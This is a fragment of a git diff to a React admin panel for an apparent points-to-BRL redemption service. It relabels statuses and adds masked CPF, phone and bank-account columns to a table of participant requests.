                       className="w-full h-10 pl-9 pr-3 rounded-lg border border-neutral-300 text-sm focus:outline-none focus:border-[#FE0A8C]"
                     />
                   </div>
@@ -910,7 +1599,7 @@ export function AdminPanel({
                         [
                           ['todas', 'Todas'],
                           ['consultado', 'Consultado'],
-                          ['troca_solicitada', 'Troca confirmada'],
+                          ['troca_solicitada', 'Em processamento'],
                         ] as const
                       ).map(([val, label]) => (
                         <button
@@ -964,20 +1653,20 @@ export function AdminPanel({
                         <tr className="border-b border-neutral-200 bg-neutral-50 text-xs font-semibold text-neutral-600">
                           <th className="py-3 px-4">Protocolo</th>
                           <th className="py-3 px-4">Participante</th>
-                          <th className="py-3 px-4">Referência</th>
+                          <th className="py-3 px-4">CPF / Contato</th>
                           <th className="py-3 px-4 text-right">Pontos</th>
                           <th className="py-3 px-4 text-right">Valor em R$</th>
-                          <th className="py-3 px-4">Status / Modalidade</th>
+                          <th className="py-3 px-4">Status / Conta para Depósito</th>
                           <th className="py-3 px-4">Data</th>
                           <th className="py-3 px-4 text-right">Ações</th>
                         </tr>
                       </thead>
                       <tbody className="divide-y divide-neutral-200">
                         {filteredConsultas.map((row) => {
-                          const rowBrl = calculateConvertedBrl(
-                            row.pointsAvailable,
-                            getRateLabelForRow(row),
-                          );
+                          const rowBrl =
+                            typeof row.amountBrl === 'number' && Number.isFinite(row.amountBrl)
+                              ? row.amountBrl
+                              : calculateConvertedBrl(row.pointsAvailable, getRateLabelForRow(row));
                           return (
                             <tr key={row.id} className="hover:bg-neutral-50/70">
                               <td className="py-3 px-4 font-mono text-xs text-neutral-700 tabular-nums whitespace-nowrap">
@@ -986,8 +1675,9 @@ export function AdminPanel({
                               <td className="py-3 px-4 font-medium text-[#151515]">
                                 {row.profileLabel}
                               </td>
-                              <td className="py-3 px-4 font-mono text-xs text-neutral-700 tabular-nums whitespace-nowrap">
-                                {row.referenceCode}
+                              <td className="py-3 px-4 font-mono text-xs text-neutral-600 tabular-nums whitespace-nowrap">
+                                <div>{row.cpfMasked || '***.***.***-**'}</div>
+                                <div className="text-neutral-400">{row.phoneMasked || '(**) *****-****'}</div>
                               </td>
                               <td className="py-3 px-4 font-mono text-right font-semibold text-[#151515] tabular-nums whitespace-nowrap">
                                 {row.pointsAvailable.toLocaleString('pt-BR')}
@@ -998,9 +1688,13 @@ export function AdminPanel({
                               <td className="py-3 px-4">
                                 {row.status === 'troca_solicitada' ? (
                                   <div className="text-xs">
-                                    <span className="font-semibold text-emerald-700">Troca confirmada</span>
-                                    {row.selectedOptionTitle && (
-                                      <span className="block text-neutral-500">{row.selectedOptionTitle}</span>
+                                    <span className="font-semibold text-[#C8006B]">
+                                      Em análise e processamento
+                                    </span>
+                                    {(row.bankLabel || row.agencyMasked || row.accountMasked) && (
+                                      <span className="block font-mono text-neutral-500">
+                                        {row.bankLabel || 'Conta Corrente'} · Ag. {row.agencyMasked || '***'} · CC {row.accountMasked || '***'}
+                                      </span>
                                     )}
                                   </div>
                                 ) : (
